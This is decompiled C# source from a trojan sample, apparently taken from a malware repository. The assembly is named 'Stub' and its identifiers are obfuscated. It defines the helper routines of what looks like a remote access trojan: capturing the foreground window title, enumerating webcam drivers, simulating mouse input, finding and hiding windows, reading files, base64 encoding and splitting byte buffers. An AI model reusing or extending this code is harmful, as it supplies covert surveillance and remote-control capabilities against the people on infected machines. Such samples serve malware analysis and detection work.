// Decompiled with JetBrains decompiler
// Type: @Ӛ
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A333FCE7-81CE-4CAF-8053-DB422244ECF1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-a6a135c2b4d2e961071a0291c88f3690fe0734ba8f8b54b41ef339d643325fb9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

[StandardModule]
internal sealed class \u0040Ӛ
{
  [DllImport("user32", EntryPoint = "mouse_event", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern void \u0040ӓ(
    int _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4);

  public static string \u0040Ӕ(byte[] _param0) => Encoding.Default.GetString(_param0);

  public static Array \u0040ӕ(byte[] _param0, string _param1)
  {
    List<byte[]> numArrayList = new List<byte[]>();
    MemoryStream memoryStream1 = new MemoryStream();
    MemoryStream memoryStream2 = new MemoryStream();
    string[] strArray = Strings.Split(\u0040Ӛ.\u0040Ӕ(_param0), _param1);
    memoryStream1.Write(_param0, 0, strArray[0].Length);
    memoryStream2.Write(_param0, checked (strArray[0].Length + _param1.Length), checked (_param0.Length - strArray[0].Length + _param1.Length));
    numArrayList.Add(memoryStream1.ToArray());
    numArrayList.Add(memoryStream2.ToArray());
    memoryStream1.Dispose();
    memoryStream2.Dispose();
    return (Array) numArrayList.ToArray();
  }

  public static string \u0040Ӗ(ref string _param0) => Convert.ToBase64String(Encoding.UTF8.GetBytes(_param0));

  public static string \u0040ӗ(ref string _param0) => Encoding.UTF8.GetString(Convert.FromBase64String(_param0));

  public static string \u0040Ә(string _param0) => File.ReadAllText(_param0);

  [DllImport("avicap32.dll", EntryPoint = "capGetDriverDescriptionA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern bool \u0040ә(
    short _param0,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
    int _param2,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param3,
    int _param4);

  [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr \u0040Ӛ();

  [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040ӛ(IntPtr _param0, ref int _param1);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040Ӝ(IntPtr _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040ӝ(long _param0);

  public static string \u0040Ӟ()
  {
    string str1;
    try
    {
      IntPtr num1 = \u0040Ӛ.\u0040Ӛ();
      if (num1 == IntPtr.Zero)
      {
        str1 = "";
      }
      else
      {
        int num2 = \u0040Ӛ.\u0040ӝ((long) num1);
        string str2 = Strings.StrDup(checked (num2 + 1), "*");
        \u0040Ӛ.\u0040Ӝ(num1, ref str2, checked (num2 + 1));
        int processId;
        \u0040Ӛ.\u0040ӛ(num1, ref processId);
        if (processId == 0)
        {
          str1 = str2;
        }
        else
        {
          try
          {
            str1 = Process.GetProcessById(processId).MainWindowTitle;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            str1 = str2;
            ProjectData.ClearProjectError();
          }
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = "";
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  [DllImport("user32.dll", EntryPoint = "FindWindow", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr \u0040ӟ(string _param0, string _param1);

  [DllImport("user32.dll", EntryPoint = "GetWindow", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr \u0040Ӡ(IntPtr _param0, uint _param1);

  [DllImport("user32.dll", EntryPoint = "IsWindowVisible", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern bool \u0040ӡ(IntPtr _param0);

  [DllImport("user32.dll", EntryPoint = "ShowWindow", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern bool \u0040Ӣ(IntPtr _param0, int _param1);

  public enum \u0040ӓ
  {
    \u0040Ӕ = 0,
    \u0040ӕ = 1,
    \u0040Ӗ = 2,
    \u0040ӗ = 3,
    \u0040Ә = 4,
    \u0040ә = 5,
    \u0040Ӛ = 6,
    \u0040ӛ = 7,
    \u0040Ӝ = 8,
    \u0040ӝ = 9,
    \u0040Ӟ = 10, // 0x0000000A
    \u0040ӟ = 11, // 0x0000000B
    \u0040Ӡ = 11, // 0x0000000B
  }

  public enum \u0040Ӕ : uint
  {
    \u0040Ӕ,
    \u0040ӕ,
    \u0040Ӗ,
    \u0040ӗ,
    \u0040Ә,
    \u0040ә,
    \u0040Ӛ,
  }
}
